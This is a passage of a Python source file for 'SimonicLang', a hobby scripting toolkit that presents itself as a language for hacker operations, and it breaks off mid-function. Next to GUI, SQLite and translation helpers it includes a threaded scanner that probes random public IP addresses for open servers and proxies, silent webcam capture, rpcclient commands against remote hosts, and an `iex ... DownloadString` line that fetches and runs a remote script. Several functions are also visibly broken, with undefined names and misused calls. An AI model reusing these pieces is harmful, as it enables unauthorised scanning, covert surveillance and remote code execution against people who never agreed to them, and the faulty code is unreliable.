# !/usr/bin/env python
# SimonicLang Programing Language
# This is a programming language that can easily and quickly perform many operations performed by hacker.

import sys
import os
import subprocess
import platform
import socket
import json
import threading
import time
import random
import webbrowser
import secrets
import shutil
import ssl
import tempfile
import asyncio
import base64
import hashlib
import math

gctrue = 0
gcfalse = 0


def sqlConnect(file, varname):
    global vars
    import sqlite3
    conn = sqlite3.connect(file)
    cursor = conn.cursor()
    with lock:
        vars[str(varname)] = cursor


def sqlExecute(varname, code):
    global vars
    cursor = vars[str(varname)]
    cursor.execute(code)


def sqlClose(varname):
    global vars
    cursor = vars[str(varname)]
    cursor.close()
    with lock:
        del vars[str(varname)]


def clipboard_copy(text):
    try:
        import pyperclip
    except:
        try:
            subprocess.run("pip install pyperclip".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import pyperclip
    pyperclip.copy(text)


def clipboard_paste(varname):
    global vars
    try:
        import pyperclip
    except:
        try:
            subprocess.run("pip install pyperclip".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import pyperclip
    with lock:
        vars[varname] = pyperclip.paste()


def shorturl(url):
    try:
        import pyshorteners
    except:
        try:
            subprocess.run("pip install pyshorteners".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import pyshorteners
    shortener = pyshorteners.Shortener()
    return shortener.tinyurl.short(url)


def unicodeSearch(text):
    import unicodedata
    founds = []
    for h in range(1114112):
        try:
            if text in unicodedata.name(chr(h)).lower():
                founds.append(chr(h))
        except:
            pass
    return founds


def translate(text, textlang, newlang, a=False):
    textlang = textlang.lower()
    newlang = newlang.lower()
    if textlang == "auto":
        try:
            from langdetect import detect
        except:
            try:
                subprocess.run("pip install langdetect".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from langdetect import detect
        textlang = detect(text)
    if a:
        try:
            subprocess.run("pip install googletrans==4.0.0-rc1".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        from googletrans import Translator
    else:
        try:
            from googletrans import Translator
        except:
            try:
                subprocess.run("pip install googletrans==4.0.0-rc1".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from googletrans import Translator
    try:
        tool = Translator()
        new = tool.translate(text, src=textlang, dest=newlang)
        return new.text
    except:
        return translate(text, textlang, newlang, a=True)


class Clock:
    def __init__(self):
        self.s1 = 0
        self.s2 = 0
        self.t = time.time

    def run(self):
        self.s1 = self.t()

    def stop(self):
        self.s2 = self.t()
        return self.s2-self.s1


class SLCheck:
    def __init__(self):
        pass

    def check_files(self):
        names = "code.sl documentation.txt LICENSE logo.ico NAMELICENSE README.md setup.bat simlang.py SIMONICNET_INFO.txt SLCompiler.exe SYNTAXRULES.md".split()
        results = {}
        list = os.listdir()
        for name in names:
            if name in list:
                results[name] = True
            else:
                results[name] = False
        return results

    def check_path(self):
        import getpass
        path = os.getcwd()
        name = getpass.getuser()
        if os.name == "nt":
            correct_path = f"C:\\Users\\{name}\\Desktop\\SimonicLang"
            if path == correct_path:
                return True
            else:
                return False
        else:
            correct_path = f"/home/{name}/Desktop/SimonicLang"
            if path == correct_path:
                return True
            else:
                return False

    def check_modules(self):
        import importlib
        names = "tkinter pygame openai requests cv2 pyautogui win32api plyer PIL autopep8 fs midiutil flask psutil fake_useragent datetime pyperclip googletrans langdetect rotatescreen numpy sounddevice scipy pyaudio".split()
        results = {}
        for name in names:
            try:
                importlib.import_module(name)
                results[name] = True
            except:
                results[name] = False
        return results

    def check_all(self):
        modules = self.check_modules()
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        files = self.check_files()
        path = self.check_path()
        name = platform.system()
        ver = platform.version()
        pinfo = f"{name} {ver}"
        print(f"Platform: \033[92m{pinfo}\033[0m")
        ver = platform.python_version().split(".")[0:2]
        ver = float(".".join(ver))
        if ver >= 3.10:
            verus = "Updated √"
        else:
            verus = "Don't Updated ×"
        pinfo = f"{ver} - {verus}"
        print(f"Python Info: \033[92m{pinfo}\033[0m")
        ver = fstring("$<sys.slver>")
        print(f"SimonicLang Info: \033[92m{ver}\033[0m")
        print()
        truen = 0
        maxn = 0
        print(f"File results:")
        print()
        for file, result in files.items():
            if result:
                truen += 1
                print(f"{file}: \033[92mOK √\033[0m")
            else:
                print(f"{file}: \033[91m\033[1mNO ×\033[0m")
            maxn += 1
        print()
        print(f"True files: \033[92m{(truen/maxn)*100:.1f} %\033[0m")
        print()
        truen2 = 0
        maxn2 = 0
        print("Module results:\n")
        for module, result in modules.items():
            if result:
                truen2 += 1
                print(f"{module}: \033[92mOK √\033[0m")
            else:
                print(f"{module}: \033[91m\033[1mNO ×\033[0m")
            maxn2 += 1
        print()
        print(f"True modules: \033[92m{(truen2/maxn2)*100:.1f} %\033[0m")
        print()
        print(f"Working path?: \033[92m{path}\033[0m")
        print()
        diff = ((truen+truen2)/(maxn+maxn2))*100
        print(f"CHECK TRUE: \033[92m{diff:.1f} %\033[0m")
        if diff >= 80:
            print(f"WARNING: \033[92mNone\033[0m")
        elif diff >= 65:
            print(
                f"WARNING: \033[93mTry running your setup.bat file in your SimonicLang folder this will install the necessary modules\033[0m")
        elif diff >= 40:
            print(
                f"WARNING: \033[93mYou may need to reinstall (update) SimonicLang and run your setup.bat file.\033[0m")
        else:
            print(
                f"WARNING: \033[91mPlease reinstall SimonicLang and run the setup.bat file because there is a lot of data loss and errors\033[0m")


class Pageleus:
    def __init__(self, title="Unknow"):
        import subprocess
        try:
            import tkinter as tk
            from tkinter import scrolledtext
            from tkinter import messagebox
            from PIL import Image, ImageTk
            from tkinter import colorchooser
            from tkinter import filedialog
        except:
            try:
                subprocess.run("pip install tkinter".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            try:
                subprocess.run("pip install Pillow".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import tkinter as tk
            from tkinter import scrolledtext
            from tkinter import messagebox
            from PIL import Image, ImageTk
            from tkinter import colorchooser
            from tkinter import filedialog
        self.tk = tk
        self.scrolledtext = scrolledtext
        self.messagebox = messagebox
        self.Image = Image
        self.ImageTk = ImageTk
        self.colorchooser = colorchooser
        self.filedialog = filedialog
        self.bgcolor = "#535353"
        self.bgcolor2 = "#404040"
        self.fgcolor = "#EBEBEB"
        self.root = tk.Tk()
        self.root.iconbitmap(default="")
        self.root.title(title)
        self.root.configure(bg=self.bgcolor)
        self.objs = {}
        self.un = []

    def update(self):  # is for updating the general state of items, should always be used before the mainloop otherwise design errors will occur
        self.root.configure(bg=self.bgcolor)
        for item, value in self.objs.items():
            try:
                value.config(bg=self.bgcolor2, fg=self.fgcolor,
                             highlightbackground=self.fgcolor)
            except:
                pass
            try:
                value.configure(bg=self.bgcolor2, fg=self.fgcolor,
                                highlightbackground=self.fgcolor)
            except:
                pass
            if item in self.un:
                try:
                    value.configure(bg=self.bgcolor, fg=self.fgcolor,
                                    highlightbackground=self.fgcolor)
                except:
                    pass

    def add_image(self, id, file):
        image = self.Image.open(file)
        photo = self.ImageTk.PhotoImage(image)
        sys = self.tk.Label(self.root, image=photo)
        sys.pack()
        self.objs[id] = sys
        self.un.append(id)

    def set_image(self, id, file):
        image = self.Image.open(file)
        photo = self.ImageTk.PhotoImage(image)
        photo = photo.resize((xsize, ysize))
        self.objs[id].config(image=file)

    def add_label(self, id, text, font, size):
        font = (font, size)
        sys = self.tk.Label(self.root, text=text, font=font)
        sys.pack()
        self.objs[id] = sys
        self.un.append(id)

    def set_label(self, id, text):
        self.objs[id].config(text=text)

    def add_button(self, id, text, width, height, code):
        sys = self.tk.Button(self.root, text=text, width=width,
                             height=height, command=lambda: exec(code))
        sys.pack()
        self.objs[id] = sys

    def set_button(self, id, text, code):
        self.objs[id].config(text=text, command=code)

    def add_input(self, id, text, width):
        sys = self.tk.Entry(self.root, width=width)
        sys.insert(0, text)
        sys.pack()
        self.objs[id] = sys

    def set_input(self, id, text):
        self.objs[id].delete(0, "end")
        self.objs[id].insert(0, text)

    def get_input(self, id):
        return self.objs[id].get()

    def add_text(self, id, text, width, height, editable):
        sys = self.scrolledtext.ScrolledText(
            self.root, wrap=self.tk.WORD, width=width, height=height)
        sys.delete("1.0", self.tk.END)
        sys.insert(self.tk.END, text)
        if editable == False:
            sys.configure(state="disabled")
        sys.pack()
        self.objs[id] = sys

    def set_text(self, id, text, editable):
        if editable:
            self.objs[id].configure(state="normal")
        else:
            self.objs[id].configure(state="disabled")
        self.objs[id].delete("1.0", self.tk.END)
        self.objs[id].insert(self.tk.END, text)

    def get_text(self, id):
        return self.objs[id].get("1.0", self.tk.END)

    def add_menu(self, id):
        sys = self.tk.Menu(self.root)
        self.root.config(menu=sys)
        self.objs[id] = sys

    def add_optionlist(self, id, listid, name):
        sys = self.tk.Menu(self.objs[id], tearoff=0)
        self.objs[id].add_cascade(label=name, menu=sys)
        self.objs[listid] = sys

    def add_option(self, listid, name, code):
        self.objs[listid].add_command(label=name, command=lambda: exec(code))

    def add_splitter(self, listid):
        self.objs[listid].add_separator()

    def set_colors(self, bg, fg, bg2):
        self.bgcolor = bg
        self.fgcolor = fg
        self.bgcolor2 = bg

    def mainloop(self):
        self.root.mainloop()

    def fullsc(self):
        self.root.attributes("-fullscreen", True)

    def boxsc(self):
        self.root.attributes("-fullscreen", True)

    def msgBox(self, title, text):
        self.messagebox.showinfo(title, text)

    def okBox(self, title, text):
        return self.messagebox.askokcancel(title, text)

    def warnBox(self, title, text):
        self.messagebox.showwarning(title, text)

    def errorBox(self, title, text):
        self.messagebox.showerror(title, text)

    def questBox(self, title, text):
        q = self.messagebox.askquestion(title, text)
        if q == "yes":
            return True
        else:
            return False

    def confirmBox(self, title, text):
        return self.messagebox.askyesno(title, text)

    def tryBox(self, title, text):
        return self.messagebox.askretrycancel(title, text)

    def colorchc(self, title):
        q = self.colorchooser.askcolor(title=title)[1]
        return q

    def filechc(self, title):
        q = self.filedialog.askopenfilename(title=title)
        return q

    def close(self):
        self.root.destroy()

    def hide(self):
        self.root.withdraw()

    def open(self):
        self.root.deiconify()

    def icon(self, file):
        self.root.iconbitmap(default=file)

    def remove(self, id):
        self.objs[id].destroy()
        del self.objs[id]
        if id in self.un:
            del self.un[self.un.index(id)]


class Function:
    def __init__(self, code, args):
        self.args = args
        self.code = code

    def run(self, myargs):
        code = self.code
        for item, value in zip(self.args, myargs):
            code = code.replace(f"$<args.{item}>", str(value))
        Syntax().run(code)

    def delete(self):
        del self


class Genarleus:  # A system that can generate information based on specific seed IDs
    def __init__(self):
        self.genars = {}

    def choice(self, id, list):
        id += len(list)**2
        id += len(str(list).encode())
        id = id**3
        id = id % len(list)
        return list[id]

    def set(self, name, list):
        self.genars[name] = list

    def remove(self, name):
        try:
            del self.genars[name]
        except:
            pass

    def generate(self, id):
        data = {}
        for name, list in self.genars.items():
            data[name] = self.choice(id, list)
        return data


class SimonicAI:  # An artificial intelligence model with its own NLP algorithm
    def __init__(self):
        self.brain = {}
        self.level = 0
        self.chocLevel = 1
        self.xyzLevel = 1

    # Resets additional use of AI (Resets Nerve level and AI preference algorithm)
    def clearbuffer(self):
        self.chocLevel = 1
        self.xyzLevel = 1
        self.level = 0

    def resetbrain(self):  # Completely resets the brain of artificial intelligence
        self.clearbuffer()
        self.brain = {}

    def use(self):  # The method of changing decisions to give different answers
        self.chocLevel += self.level**2
        self.xyzLevel += self.chocLevel

    def getXyz(self):  # Outputs artificial intelligence statistics in json format
        w0 = 0
        w1 = 0
        for h, v in self.brain.items():
            if v == 0:
                w0 += 1
            else:
                w1 += 1
        by = 0
        by += len(json.dumps(self.brain).encode())
        by += len(str(self.level))
        by += len(str(self.chocLevel))
        by += len(str(self.xyzLevel))
        if w0 > w1:
            ailevel = "Bad"
        elif w1 > w0:
            ailevel = "Good"
        else:
            ailevel = "Beautiful"
        return {"W0": w0, "W1": w1, "WS": w0+w1, "SIZE": by, "ANGER": self.level, "CHOCSTAT": self.chocLevel, "XYZSTAT": self.xyzLevel, "AI": ailevel}

    def check(self):  # Important function to keep the nerve level at a certain level
        if self.level >= 10:
            self.level = 10
        elif self.level <= -10:
            self.level = -10

    def shuffle(self):  # A second method to shake up the entire AI brain to respond differently
        list = []
        for item, v in self.brain.items():
            list.append(item)
        list2 = []
        while True:
            if len(list) == 0:
                break
            bb = self.aiChoc(list)
            del list[list.index(bb)]
            list2.append(bb)
        list = list2
        del list2
        brain = {}
        for item in list:
            brain[item] = self.brain[item]
        self.brain = brain

    def aiChoc(self, list):  # The function of artificial intelligence that makes its own thoughts and decisions
        a = int((int(((len(list)**2+self.chocLevel)))*self.xyzLevel)) % len(list)
        self.use()
        if len(list) >= 1:
            try:
                return list[a]
            except:
                return ""
        else:
            return ""

    def learn(self, text, xyz):  # xyz: 0=Negative 1=Positive
        if len(text) >= 1:
            self.brain[text] = xyz

    def unlearn(self, text):  # Nevermind some data
        if text in self.brain:
            del self.brain[text]

    # Automatic learning strategy by combining artificial intelligence's current state with its own decision
    def autolearn(self, text, splitter=" "):
        from difflib import SequenceMatcher
        for h in text.split(splitter):
            if h in self.brain:
                self.use()
            else:
                test = None
                for item, value in self.brain.items():
                    if SequenceMatcher(None, item, h).ratio()*100 >= self.aiChoc(range(80, 95)):
                        test = value
                if test == None:
                    if len(h) >= 1:
                        list = [0, 1]
                        if self.level >= 1:
                            list += [0]*int(self.level/2)
                        elif self.level <= -1:
                            l = int(str(self.level).replace("-", ""))
                            list += [1]*int(l/2)
                        a = self.aiChoc(list)
                        self.brain[h] = a
                else:
                    self.brain[h] = test

    # Autolearn Function is a function made by retrieving data from the internet.
    def weblearn(self, url):
        try:
            subprocess.run("pip install requests".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            import requests
            text = requests.get(url, timeout=3.5).text
        except:
            text = ""
        for p in ["h1", "h2", "h3", "h4", "h5", "h6", "p"]:
            textt = text.split(f"<{p}>")
            del textt[0]
            for h in textt:
                h = h.split(f"</{p}>")[0]
                self.autolearn(h)

    def read(self, text):  # Artificial intelligence changes emotions by reading the comment
        text = text.split()
        x1 = 0
        x2 = 0
        for h in text:
            if h in self.brain:
                a = self.brain[h]
                if a == 0:
                    self.level += 1
                    x1 += 1
                else:
                    self.level -= 1
                    x2 += 1
        if x1 > x2:
            self.level += 1
        elif x2 > x1:
            self.level -= 1
        else:
            if self.level >= 1:
                self.level -= 1
            elif self.level <= -1:
                self.level += 1

    # Artificial intelligence is a response mechanism with an algorithm that responds with its own decisions and emotions and speaks in a different way.
    def get(self, length, joiner=" ", adds=True):
        recv = []
        s0 = []
        s1 = []
        for item, value in self.brain.items():
            if value == 0:
                s0.append(item)
            else:
                s1.append(item)
        for _ in range(length):
            list = [0, 1]
            if self.level >= 1:
                list += [0]*int(self.level/2)
            elif self.level <= -1:
                l = int(str(self.level).replace("-", ""))
                list += [1]*int(l/2)
            a = self.aiChoc(list)
            if a == 0:
                aa = self.aiChoc(s0)
                if adds:
                    aa += self.aiChoc(["", "", "", "", "",
                                      ".", ",", "!", "?", "..."])
                recv.append(aa)
            else:
                aa = self.aiChoc(s1)
                if adds:
                    aa += self.aiChoc(["", "", "", "", "",
                                      ".", ",", "!", "?", "..."])
                recv.append(aa)
            self.use()
        return str(joiner).join(recv)

    def save(self, file):  # Save the brain
        saver = {"brain": self.brain, "level": self.level,
                 "chocLevel": self.chocLevel, "xyz": self.xyzLevel}
        with open(file, "wb") as f:
            f.write(json.dumps(saver, indent=4).encode())

    def load(self, file):  # Load the brain
        with open(file, "rb") as f:
            saver = f.read().decode()
        saver = json.loads(saver)
        self.brain = saver["brain"]
        self.level = saver["level"]
        self.chocLevel = saver["chocLevel"]
        self.xyzLevel = saver["xyz"]

    def goodquiz(self):  # It is an accuracy measurement mechanism, it measures the similarity of each decision of artificial intelligence (In short, it measures the similarity of the desired answer and the given answer.)
        from difflib import SequenceMatcher
        save1 = self.level
        save2 = self.chocLevel
        save3 = self.xyzLevel
        save4 = self.brain
        good = 0
        goodx = 0
        for n in range(1, 11):
            text = self.get(n)
            self.read(text)
            text2 = self.get(n)
            test = SequenceMatcher(None, text, text2).ratio()*100
            if test >= 50:
                good += 1
            goodx += 1
            self.clearbuffer()
            self.shuffle()
        self.level = save1
        self.chocLevel = save2
        self.xyzLevel = save3
        self.brain = save4
        return (good/goodx)*100


class OpenAI:
    def __init__(self, apikey):
        try:
            import openai
        except:
            try:
                subprocess.run(f"pip install openai==0.28".split(
                ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import openai
        openai.api_key = apikey
        self.oai = openai
        self.engine = "davinci-002"

    def setEngine(self, engine):
        self.engine = engine

    def talk(self, text, size):
        openai = self.oai
        response = openai.Completion.create(
            engine=self.engine, prompt=text, max_tokens=50*size, presence_penalty=0).choices[0].text.strip()
        return response


class Nebuleus:
    def __init__(self):
        self.found = ""
        import socket
        self.s = socket
        import threading
        self.t = threading
        import random
        self.r = random
        import time
        self.tt = time
        try:
            import requests
        except:
            import subprocess
            try:
                subprocess.run("pip install requests".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            import requests
        self.rr = requests
        self.l = threading.Lock()

    def portscan(self, host, port):
        socket = self.s
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((host, port))
            res = True
        except:
            res = False
        finally:
            s.close()
        return res

    def finderbot(self, port):
        socket = self.s
        random = self.r
        host = random.choice([str(random.randint(1, 126)), str(random.randint(128, 191)), str(random.randint(193, 224)), str(
            random.randint(230, 255))])+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((host, port))
            with self.l:
                self.found = host
        except:
            pass
        finally:
            s.close()

    def finderbot_proxy(self, port):
        random = self.r
        requests = self.rr
        host = random.choice([str(random.randint(1, 126)), str(random.randint(128, 191)), str(random.randint(193, 224)), str(
            random.randint(230, 255))])+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
        if self.portscan(host, port):
            proxies = {"http": f"http://{host}:{port}/",
                       "https": f"https://{host}:{port}"}
            try:
                result = requests("http://google.com/",
                                  proxies=proxies, timeout=2).status_code
                if result in [202, 200, 401]:
                    with self.l:
                        self.found = host
            except:
                pass

    def findserver(self, port):
        threading = self.t
        time = self.tt
        self.found = ""
        while True:
            ts = []
            for _ in range(50):
                t = threading.Thread(target=self.finderbot, args=(port,))
                t.start()
                ts.append(t)
                time.sleep(0)
                if self.found == "":
                    pass
                else:
                    break
            for t in ts:
                t.join()
            if self.found == "":
                pass
            else:
                break
        return self.found

    def findproxy(self, port):
        threading = self.t
        time = self.tt
        self.found = ""
        while True:
            ts = []
            for _ in range(50):
                t = threading.Thread(target=self.finderbot_proxy, args=(port,))
                t.start()
                ts.append(t)
                time.sleep(0)
                if self.found == "":
                    pass
                else:
                    break
            for t in ts:
                t.join()
            if self.found == "":
                pass
            else:
                break
        return self.found

    def findurls(self, url):
        requests = self.rr
        try:
            a = requests.get(url, timeout=2).text
        except:
            a = ""
        urls = []
        b = a.split("href='")
        del b[0]
        for h in b:
            try:
                if h[0] == "/":
                    h = url+h[1:]
            except:
                pass
            urls.append(h.split("'")[0])
        b = a.split('href="')
        del b[0]
        for h in b:
            try:
                if h[0] == "/":
                    h = url+h[1:]
            except:
                pass
            urls.append(h.split('"')[0])
        return urls

    def findtextobj(self, obj, url):
        requests = self.rr
        try:
            a = requests.get(url, timeout=2).text
        except:
            a = ""
        objs = []
        b = a.split(f"{obj}='")
        del b[0]
        for h in b:
            objs.append(h.split("'")[0])
        b = a.split(f'{obj}="')
        del b[0]
        for h in b:
            objs.append(h.split('"')[0])
        return objs

    def findintobj(self, obj, url):
        requests = self.rr
        try:
            a = requests.get(url, timeout=2).text
        except:
            a = ""
        objs = []
        b = a.split(f"{obj}=")
        del b[0]
        for h in b:
            objs.append(h.split(" ")[0])
        return objs

    def findhtmlobj(self, obj, url):
        requests = self.rr
        try:
            a = requests.get(url, timeout=2).text
        except:
            a = ""
        objs = []
        b = a.split(f"<{obj}>")
        del b[0]
        for h in b:
            objs.append(h.split(f"</{obj}>")[0])
        return objs

    def send(self, type, host, port, pack):
        if type == "tcp":
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((host, port))
                s.sendall(pack.encode())
            except:
                pass
            finally:
                s.close()
        else:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                s.sendto(pack.encode(), (host, port))
            except:
                pass
            finally:
                s.close()

    def getall(self, s):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        return recv.decode("utf-8", errors="ignore")

    def send_withrecv(self, type, host, port, pack):
        if type == "tcp":
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((host, port))
                s.sendall(pack.encode())
                recv = self.getall(s)
                return recv
            except:
                pass
            finally:
                s.close()
        else:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                s.sendto(pack.encode(), (host, port))
                recv = self.getall(s)
                return recv
            except:
                pass
            finally:
                s.close()

    def sendssl(self, type, host, port, pack):
        if type == "tcp":
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, port)) as sock:
                    sock.settimeout(1)
                    with context.wrap_socket(sock, server_hostname=host) as s:
                        s.sendall(pack.encode())
            except:
                pass
        else:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLS)
                s.settimeout(1)
                s.sendto(pack.encode(), (host, port))
            except:
                pass
            finally:
                s.close()

    def sendssl_withrecv(self, type, host, port, pack):
        if type == "tcp":
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, port)) as sock:
                    sock.settimeout(1)
                    with context.wrap_socket(sock, server_hostname=host) as s:
                        s.sendall(pack.encode())
                        recv = self.getall(s)
                        return recv
            except:
                return "error"
        else:
            try:
                ss = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s = ssl.wrap_socket(ss, ssl_version=ssl.PROTOCOL_TLS)
                s.settimeout(1)
                s.sendto(pack.encode(), (host, port))
                recv = self.getall(s)
                s.close()
                return recv
            except:
                pass


class VRam:  # Real virtual memory tool requiring internet using SimonicRadio
    def __init__(self):
        self.id = str(random.randint(1111111, 9999999))

    def set(self, varname, data):
        SimonicRadio().sendSignal(f"{self.id}/{varname}", data)

    def get(self, varname):
        return SimonicRadio().sendSignal(f"{self.id}/{varname}", "")

    def get_id(self):
        return self.id

    def load_id(self, id):
        self.id = id


def runC(code):
    file = str(random.randint(10000000, 99999999999))+".c"
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"gcc {file} -o {file}.sh".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    try:
        subprocess.run(f"./{file}.sh".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file, "w") as f:
        f.write("")
    with open(file+".sh", "w") as f:
        f.write("")
    os.remove(file)
    os.remove(file+".sh")


def runJS(code):
    try:
        import execjs
    except:
        try:
            subprocess.run("pip install execjs".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import execjs
    ctx = execjs.compile(code)
    ctx.eval(code)


def runJava(code):
    file = str(random.randint(10000000, 99999999999))
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"javac {file}.java".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    try:
        subprocess.run(f"java {file}".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file+".java", "w") as f:
        f.write("")
    with open(file, "w") as f:
        f.write("")
    os.remove(file+".java")
    os.remove(file)


def runRuby(code):
    file = str(random.randint(10000000, 99999999999))+".rb"
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"ruby {file}".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file, "w") as f:
        f.write("")
    os.remove(file)


def runSwift(code):
    file = str(random.randint(10000000, 99999999999))+".swift"
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"swift {file}".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file, "w") as f:
        f.write("")
    os.remove(file)


def runGo(code):
    file = str(random.randint(10000000, 99999999999))+".go"
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"go run {file}".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file, "w") as f:
        f.write("")
    os.remove(file)


def runPHP(code):
    file = str(random.randint(10000000, 99999999999))+".php"
    with open(file, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        subprocess.run(f"php {file}".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        print(str(e))
    with open(file, "w") as f:
        f.write("")
    os.remove(file)


def rotateScreen(degree):
    try:
        from rotatescreen import get_primary_display
    except:
        try:
            subprocess.run("pip install rotate-screen".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        from rotatescreen import get_primary_display
    screen = get_primary_display()
    screen.rotate_to(degree)
    del screen
    del rotate


def rotateScreenRandom():
    rotateScreen(random.choice([90, 180, 270]))


def radioSignal(duration, samplerate, hz):
    try:
        import numpy as np
        import sounddevice as sd
    except:
        try:
            subprocess.run("pip install numpy".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install sounddevice".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install pyaudio".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import numpy as np
        import sounddevice as sd
    t = np.linspace(0, duration, duration*samplerate)
    signal = np.sin(2*np.pi*hz*t)
    sd.play(signal, samplerate=samplerate)
    sd.wait()


def radioSignalBg(duration, samplerate, hz):
    try:
        import numpy as np
    except:
        try:
            subprocess.run("pip install numpy".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import numpy as np
    t = np.linspace(0, duration, duration*samplerate)
    signal = np.sin(2*np.pi*hz*t)


def download(target, file, output):
    s = SimonicBrowser()
    s.setupUA()
    s.download("default", target, file, output)
    del s


def busywait(duration):
    e = time.time() + duration
    while time.time() < e:
        pass


def rpcFile(ip, path):
    subprocess.run(f"rpc {path} {ip}:".split(),
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def rpcCom(ip, command):
    subprocess.run(f"rpcclient {ip} -c".split() +
                   [command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def rpcSetup():
    if os.name == "nt":
        try:
            subprocess.run(f"choco install rpc".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            subprocess.run(f"""powershell -Command @powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET 'PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin'""".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(f"choco install rpc".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        subprocess.run(f"apt-get install rpc".split(),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def showimg(title, file):
    try:
        import cv2
    except:
        try:
            subprocess.run("pip install opencv-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install opencv-contrib-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import cv2
    image = cv2.imread(file)
    cv2.imshow(title, image)


def openLocation(ip):
    lan = ipapiGet(ip, "latitude")
    lon = ipapiGet(ip, "longitude")
    webbrowser.open(
        f"https://www.google.com/maps/search/?api=1&query={lan},{lon}")


def showimgstop():
    try:
        import cv2
    except:
        try:
            subprocess.run("pip install opencv-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install opencv-contrib-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import cv2
    cv2.destroyAllWindows()


def capture(filename, w, h):
    try:
        import cv2
    except:
        try:
            subprocess.run("pip install opencv-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install opencv-contrib-python".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import cv2
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, w)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
        cap.release()


def mouseClickRight():
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.click(button="right")
    del pyautogui


def mouseClickLeft():
    try:
        import pyautogui
    except:
        try:
